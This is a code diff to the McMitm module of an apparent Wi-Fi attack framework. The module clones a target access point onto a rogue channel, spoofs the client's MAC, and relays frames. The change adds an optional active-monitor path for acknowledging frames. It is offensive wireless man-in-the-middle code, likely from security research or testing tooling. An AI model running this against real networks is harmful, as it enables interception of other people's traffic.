@@ -7,6 +7,7 @@
 #include "attacks/DoS_hard/dos_helpers.h"
 #include "attacks/DoS_soft/channel_switch/channel_switch.h"
 #include "attacks/mc_mitm/wifi_util.h"
+#include "attacks/two_iface/TwoIfaceActive.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
 #include "scan/active/scan_AP.h"
@@ -62,11 +63,12 @@ void McMitm::setup_real_AP_RSN_frames(int beacon_timeout_sec) {
 	probe_resp = make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
 	log(LogLevel::INFO, "Target network {} detected on channel {}", ap.get(SK::mac), netconfig.real_channel.ch_num);
 }
-
+const string nic_client_ap = AP_IFACE_PREFIX + "client_ack";
 void McMitm::run(RunStatus &rs, const int timeout_sec) {
 
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int beacon_interval_ms = att_cfg.at("beacon_interval_ms");
+	const bool prefer_active = att_cfg.value("prefer_active", false);
 
 	log(LogLevel::INFO,
 		"Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
@@ -76,7 +78,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		if(tim.size() >= 4)
 			fill(tim.begin() + 3, tim.end(), 0xFF);
 		beacon->remove_option(Dot11ManagementFrame::TIM);
-		beacon->add_option({Dot11ManagementFrame::TIM, (uint32_t)tim.size(), tim.data()});
+		beacon->add_option({Dot11ManagementFrame::TIM, static_cast<uint32_t>(tim.size()), tim.data()});
 	}
 
 	log(LogLevel::INFO,
@@ -84,22 +86,31 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		rogue_ap->get_mon_iface(),
 		netconfig.rogue_channel.ch_num);
 
-	// put the monitor interface in active ACK mode for ACK back to AP
+	// use active_monitor ?
+	bool use_active_monitor = false;
+	if(prefer_active) {
+		if(const auto needs_active = TwoIfaceActive::find_cache_needs_active(rogue_sta)) {
+			if(*needs_active) {
+				rogue_sta->set(BK::active_monitor, true);
+			} else {
+				log(LogLevel::INFO, "prefer_active: active monitor works without active_monitor hw flag");
+			}
+			use_active_monitor = true;
+		} else {
+			log(LogLevel::WARNING, "prefer_active: no successful active_test cache for rogue_sta, using VIF fallback");
+		}
+	}
 
-	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
-	/*if(rogue_sta[BK::active_monitor]) { //FIXME not supported yet,_RSN_frames dont work with active
-		rogue_sta->set_iface_down();
-		rogue_sta->set_mac_address(client_state.get_mac());
-		rogue_sta->set_monitor_mode(true);
-		//hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
-		//interruptible_sleep(seconds(15));
-		//rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
-		rogue_sta->set_iface_up();
-	} else {*/
 	rogue_sta->set_mac_address(client_state.get_mac());
-	// client need to ACK -> AP
-	start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
-	//}
+	if(use_active_monitor) {
+		// active monitor: card ACKs frames addressed to client MAC directly (flag added if BK::active_monitor is set)
+		rogue_sta->set_monitor_mode(true);
+		rogue_sta->set_iface_up();
+		rogue_sta->set_channel(netconfig.real_channel);
+	} else {
+		// client need to ACK -> AP via hostapd VIF
+		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
+	}
 
 
 	const string bpf = "(type data or type mgt) and"
@@ -116,13 +127,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 
 	// rogue AP  ACK  AP(rogue) -> back to client
 	start_ap(rs, rogue_ap->get_ap_iface(), rogue_ap, netconfig.rogue_channel, *beacon, ap.get(SK::mac));
-	// TODO
-	// hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta-[SK::netns], false);
 
 	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
 	sock_rogue->set_filter(bpf);
 
-	rs.start_observers(ObserverRunPolicy::SKIP); //after mc_mitm preparation, skip because dmesg
+	rs.start_observers(ObserverRunPolicy::SKIP);
 
 	auto next_beacon = steady_clock::now();
 	const auto start_time = steady_clock::now();
@@ -182,7 +191,7 @@ void McMitm::stop() {
 	log(LogLevel::INFO, "Cleaning up MitM...");
 	sock_real.reset();
 	sock_rogue.reset();
-	stop_ap(AP_IFACE_PREFIX + "client_ack", rogue_sta[SK::netns]);
+	stop_ap(nic_client_ap, rogue_sta[SK::netns]);
 	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
 }
 }
